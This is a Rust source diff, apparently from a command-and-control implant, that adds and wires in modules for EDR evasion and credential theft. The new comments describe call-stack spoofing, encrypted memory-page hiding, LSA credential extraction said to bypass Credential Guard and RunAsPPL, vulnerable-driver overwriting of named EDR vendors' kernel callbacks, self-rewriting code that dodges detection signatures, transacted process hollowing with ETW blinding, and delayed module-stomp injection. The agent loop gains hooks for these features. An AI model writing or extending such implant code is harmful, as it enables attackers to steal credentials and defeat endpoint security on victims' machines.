@@ -34,6 +34,12 @@ pub mod hci_logging;
 
 pub mod syscalls;
 
+// Unwind-aware call-stack spoofing database and chain generator.
+// Provides multi-frame plausible call graph chains for the NtContinue-based
+// stack-spoof path in syscalls.rs.  Gated behind `stack-spoof` + x86_64.
+#[cfg(all(windows, feature = "stack-spoof", target_arch = "x86_64"))]
+pub mod stack_db;
+
 // Self-re-encoding ("Metamorphic Lite"): re-encode .text at runtime.
 #[cfg(feature = "self-reencode")]
 pub mod self_reencode;
@@ -62,6 +68,13 @@ pub mod ntdll_unhook;
 // and anti-forensics.  Replaces the Ekko-style sleep on Windows.
 #[cfg(windows)]
 pub mod sleep_obfuscation;
+
+// Continuous memory hiding ("Evanesco"): keeps all pages NOT actively being
+// executed in an encrypted/PAGE_NOACCESS state at ALL times.  Per-page RC4
+// encryption, VEH-based auto-decryption, and background re-encryption.
+// Windows-only, gated by the `evanesco` feature flag.
+#[cfg(all(windows, feature = "evanesco"))]
+pub mod page_tracker;
 
 // Continuous memory hygiene: PEB scrubbing, thread start address sanitization,
 // handle table cleanup, and periodic re-verification.  Works alongside the
@@ -107,6 +120,55 @@ pub mod browser_data;
 // Windows-only.
 #[cfg(windows)]
 pub mod lsass_harvest;
+
+// LSA Whisperer: credential extraction via LSA SSP interfaces.
+// Interacts with LSA authentication packages through documented interfaces,
+// operating within the LSA process's own security context.  Bypasses Credential
+// Guard and RunAsPPL.  Windows-only, gated by `lsa-whisperer`.
+#[cfg(all(windows, feature = "lsa-whisperer"))]
+pub mod lsa_whisperer;
+
+// Kernel callback overwrite (BYOVD): surgically overwrite EDR kernel callback
+// function pointers to point to a `ret` instruction instead of NULLing them.
+// Defeats EDR self-integrity checks (CrowdStrike, Defender) that verify their
+// callbacks are still registered by checking if the pointer is non-NULL.
+// Uses a vulnerable signed driver for physical memory read/write access.
+// Windows-only, gated by `kernel-callback` (implies `direct-syscalls`).
+#[cfg(all(windows, feature = "kernel-callback"))]
+pub mod kernel_callback;
+
+// Automated EDR bypass transformation engine: scans the agent's own .text
+// section for byte signatures known to be detected by EDR (YARA rules, entropy
+// heuristics, known gadget chains like "4C 8B D1 B8" for direct syscall stubs).
+// When a detected pattern is found, applies semantic-preserving transformations
+// at runtime: instruction substitution, register reassignment, nop sled
+// insertion, constant splitting, jump obfuscation.  Supplements self-reencode
+// (handles pattern avoidance before and after morphing).  Gated by
+// `evasion-transform` (implies `self-reencode`).
+#[cfg(feature = "evasion-transform")]
+pub mod edr_bypass_transform;
+
+// NTFS transaction-based process hollowing with ETW blinding: creates an
+// NTFS transaction, writes payload into a transaction-backed section,
+// creates the target process suspended, hollows it, then rolls back the
+// transaction so the file on disk never existed.  The section mapping in
+// the target process remains valid.  Includes ETW blinding with spoofed
+// Windows Defender / Sysmon provider GUIDs.  SSN resolution via existing
+// indirect syscall infrastructure with kernel32 ordinal fallback.
+// Windows-only, gated by `transacted-hollowing` feature flag.
+#[cfg(all(windows, feature = "transacted-hollowing"))]
+pub mod injection_transacted;
+
+// Delayed module-stomp injection: loads a sacrificial DLL into the target
+// process via LoadLibraryA, waits for a configurable randomized delay
+// (default 8–15 seconds) to let EDR initial-scan heuristics pass, then
+// overwrites the DLL's .text section with the payload using indirect
+// syscalls.  Two-phase: Phase 1 loads DLL and returns immediately;
+// Phase 2 (stomp + execute) fires after the delay in a background thread.
+// Payload state is stored encrypted via memory_guard.  Windows-only,
+// gated by `delayed-stomp` feature flag.
+#[cfg(all(windows, feature = "delayed-stomp"))]
+pub mod injection_delayed_stomp;
 
 use anyhow::Result;
 use common::{CryptoSession, Message, Transport};
@@ -301,6 +363,22 @@ impl Agent {
         // Applying them before validation would produce side-effects (AMSI
         // patches, thread hiding) even on hostile hosts where the agent should
         // refuse to run.
+
+        // Evanesco VEH registration must happen BEFORE any AMSI/ETW bypass
+        // activation so that the Evanesco VEH handler is lower in the chain
+        // (higher priority) and does not interfere with the AMSI HWBP VEH.
+        #[cfg(all(windows, feature = "evanesco"))]
+        {
+            let cfg = self.config.read().await;
+            let evanesco_cfg = &cfg.evanesco;
+            if let Err(e) = crate::page_tracker::init(
+                evanesco_cfg.idle_threshold_ms,
+                evanesco_cfg.scan_interval_ms,
+            ) {
+                log::warn!("evanesco: init failed (non-fatal): {e:#}");
+            }
+        }
+
         #[cfg(feature = "stealth")]
         {
             log::debug!("Applying evasion layers");
@@ -496,7 +574,30 @@ impl Agent {
             mesh.inbound_tx = Some(p2p_inbound_tx);
         }
 
+        // Iteration counter for periodic tasks (syscall cache validation, etc.).
+        let mut loop_iteration: u32 = 0;
+
         loop {
+            loop_iteration += 1;
+
+            // Periodic syscall SSN cache validation.  Cross-references the
+            // ntdll PE timestamp and probes critical syscalls to detect
+            // stale entries (e.g. after a silent Windows Update).
+            #[cfg(all(windows, feature = "direct-syscalls"))]
+            {
+                let interval = self.config.read().await.syscall.validate_interval;
+                if interval > 0 && loop_iteration % interval == 0 {
+                    match crate::syscalls::validate_cache() {
+                        Ok(n) => {
+                            log::debug!("Periodic syscall cache validation: {} entries OK", n);
+                        }
+                        Err(e) => {
+                            log::warn!("Periodic syscall cache validation failed: {e}; cache invalidated, will re-map on next syscall");
+                        }
+                    }
+                }
+            }
+
             // Drain any pending outbound messages before we block on recv().
             // This ensures responses from the previous iteration are flushed
             // before we re-acquire the lock to wait for the next command.
@@ -541,6 +642,8 @@ impl Agent {
                 }
                 _ = crate::handlers::SHUTDOWN_NOTIFY.notified() => {
                     info!("Shutdown signal received, draining tasks and shutting down.");
+                    #[cfg(all(windows, feature = "evanesco"))]
+                    crate::page_tracker::shutdown();
                     #[cfg(all(windows, feature = "stealth"))]
                     crate::amsi_defense::cleanup_com_hijack();
                     break;
@@ -596,6 +699,8 @@ impl Agent {
                 }
                 Ok(Message::Shutdown) => {
                     info!("Shutdown received, exiting.");
+                    #[cfg(all(windows, feature = "evanesco"))]
+                    crate::page_tracker::shutdown();
                     #[cfg(all(windows, feature = "stealth"))]
                     crate::amsi_defense::cleanup_com_hijack();
                     break;
